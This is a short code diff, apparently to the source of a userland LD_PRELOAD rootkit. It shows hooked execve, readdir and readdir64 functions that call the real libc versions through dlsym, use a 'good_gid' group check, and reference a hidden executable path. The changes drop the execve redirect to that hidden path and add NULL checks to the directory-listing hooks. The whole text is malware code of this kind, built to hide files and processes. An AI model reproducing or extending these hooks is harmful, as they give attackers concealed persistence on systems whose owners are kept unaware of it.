@@ -30,7 +30,7 @@ int execve(const char *path, char *const argv[], char *const envp[]) {
         o_execve = dlsym(RTLD_NEXT, "execve");
 
     if (good_gid() == 1) {
-        return o_execve(HIDDEN_EXEC_PATH, argv, envp);
+        return o_execve(path, argv, envp);
     }
 
     return o_execve(path, argv, envp);
@@ -51,6 +51,10 @@ struct dirent *readdir(DIR *p) {
     }
 
     struct dirent *dir = o_readdir(p);
+    if (dir == NULL) {
+        return NULL;
+    }
+
     return dir;
 }
 
@@ -69,6 +73,10 @@ struct dirent64 *readdir64(DIR *p) {
     }
 
     struct dirent64 *dir = o_readdir64(p);
+    if (dir == NULL) {
+        return NULL;
+    }
+
     return dir;
 }
 
